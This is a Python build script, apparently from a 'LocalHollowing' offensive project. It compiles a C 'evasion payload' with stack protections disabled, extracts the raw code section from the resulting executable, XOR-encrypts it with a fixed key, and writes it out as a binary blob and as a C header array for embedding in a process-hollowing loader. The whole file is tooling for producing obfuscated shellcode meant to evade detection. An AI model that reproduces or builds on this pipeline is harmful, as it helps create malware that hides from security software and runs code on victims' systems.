import struct, os, subprocess, sys

VCTOOLS = r"C:\Program Files\Microsoft Visual Studio\18\Community\VC\Tools\MSVC\14.51.36223"
CL = os.path.join(VCTOOLS, "bin", "HostX64", "x64", "cl.exe")
LINK = os.path.join(VCTOOLS, "bin", "HostX64", "x64", "link.exe")
SDK_INC = r"C:\Program Files (x86)\Windows Kits\10\Include\10.0.26100.0"

SRC = r"LocalHollowing\evasion_payload.c"
OBJ = r"evasion_payload.obj"
EXE = r"evasion_temp.exe"
BIN = r"LocalHollowing\evasion_blob.bin"

XOR_KEY = 0xBE

includes = [
    f'/I"{VCTOOLS}\\include"',
    f'/I"{SDK_INC}\\ucrt"',
    f'/I"{SDK_INC}\\um"',
    f'/I"{SDK_INC}\\shared"',
]

print("[+] Compiling evasion payload...")
cmd = f'"{CL}" /c /O1 /GS- /Zl /Oi- /TC {" ".join(includes)} /Fo"{OBJ}" "{SRC}"'
r = subprocess.run(cmd, shell=True, capture_output=True, text=True)
if r.returncode != 0:
    print(f"[!] Compile failed:\n{r.stderr}")
    sys.exit(1)

print("[+] Linking...")
cmd = f'"{LINK}" /NODEFAULTLIB /ENTRY:EvasionEntry /SUBSYSTEM:CONSOLE /FIXED /OUT:"{EXE}" "{OBJ}"'
r = subprocess.run(cmd, shell=True, capture_output=True, text=True)
if r.returncode != 0:
    print(f"[!] Link failed:\n{r.stderr}")
    sys.exit(1)

print("[+] Extracting .text section...")
with open(EXE, "rb") as f:
    pe = f.read()

e_lfanew = struct.unpack_from("<I", pe, 0x3C)[0]
num_secs = struct.unpack_from("<H", pe, e_lfanew + 6)[0]
opt_size = struct.unpack_from("<H", pe, e_lfanew + 20)[0]
entry_rva = struct.unpack_from("<I", pe, e_lfanew + 40)[0]

sec_off = e_lfanew + 24 + opt_size
text_raw = None
entry_offset = 0

for i in range(num_secs):
    s = sec_off + i * 40
    chars = struct.unpack_from("<I", pe, s + 36)[0]
    if chars & 0x20:
        vaddr = struct.unpack_from("<I", pe, s + 12)[0]
        rawsz = struct.unpack_from("<I", pe, s + 16)[0]
        rawptr = struct.unpack_from("<I", pe, s + 20)[0]
        text_raw = pe[rawptr:rawptr + rawsz]
        entry_offset = entry_rva - vaddr
        name = pe[s:s+8].rstrip(b"\x00").decode("ascii", errors="ignore")
        print(f"    Section: {name}, size={rawsz}, entry_offset={entry_offset}")
        break

if text_raw is None:
    print("[!] No code section found")
    sys.exit(1)

while text_raw and text_raw[-1] == 0xCC:
    text_raw = text_raw[:-1]

encrypted = bytes(b ^ XOR_KEY for b in text_raw)

with open(BIN, "wb") as f:
    f.write(struct.pack("<I", entry_offset))
    f.write(encrypted)

HDR = r"LocalHollowing\evasion_data.h"
with open(HDR, "w") as f:
    f.write("static const unsigned char g_ev[] = {\n")
    all_bytes = struct.pack("<I", entry_offset) + encrypted
    for i in range(0, len(all_bytes), 16):
        chunk = all_bytes[i:i+16]
        f.write("    " + ",".join(f"0x{b:02X}" for b in chunk) + ",\n")
    f.write("};\n")
    f.write(f"#define EV_SZ {len(text_raw)}\n")

print(f"[+] Blob: {len(text_raw)} code bytes, entry offset: {entry_offset}")
print(f"[+] Written {HDR} ({len(all_bytes)} bytes)")

for tmp in [OBJ, EXE]:
    if os.path.exists(tmp):
        os.remove(tmp)
